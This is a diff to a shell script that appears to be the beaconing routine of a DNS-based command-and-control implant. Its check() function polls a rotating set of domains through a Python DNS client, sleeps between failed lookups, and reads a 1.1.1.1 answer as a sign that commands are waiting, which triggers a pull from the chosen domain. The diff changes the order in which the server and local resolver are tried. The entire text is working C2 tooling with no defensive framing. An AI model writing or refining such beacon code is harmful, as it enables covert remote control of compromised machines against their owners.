@@ -79,26 +79,37 @@ return_output(){
 check(){
     nx=true
     sendDomain=$domain
-    cmd=$(python client.py -s $localServer $chkd$domain)    # rotate through domain names
+    cmd=$(python client.py $chkd$domain)    # rotate through domain names
+
+    ## change to server first then local
     while $nx; do
-        if [[ $cmd == "nxdomain" ]]; then
-            cmd=$(python client.py -s $localServer $chkd$domain1)
+        
+        if [[ $cmd == "local" ]]; then
+            cmd=$(python client.py -s $localServer $chkd$domain)
             if [[ $cmd == "nxdomain" ]]; then
-                cmd=$(python client.py -s $localServer $chkd$domain2)
+                cmd=$(python client.py -s $localServer $chkd$domain1)
                 if [[ $cmd == "nxdomain" ]]; then
-                    sleep 20
+                    cmd=$(python client.py -s $localServer $chkd$domain2)
+                    if [[ $cmd == "nxdomain" ]]; then
+                        sleep 20
+                    else
+                        nx=false
+                        sendDomain=$domain2
+                    fi
                 else
                     nx=false
-                    sendDomain=$domain2
+                    sendDomain=$domain1
                 fi
             else
+                sendDomain=$domain
                 nx=false
-                sendDomain=$domain1
             fi
         else
+            sendDomain=$domain
             nx=false
         fi
     done
+
     if [[ $cmd == "1.1.1.1" ]]; then  # means commands are awaiting beacons
         pull $sendDomain
     else
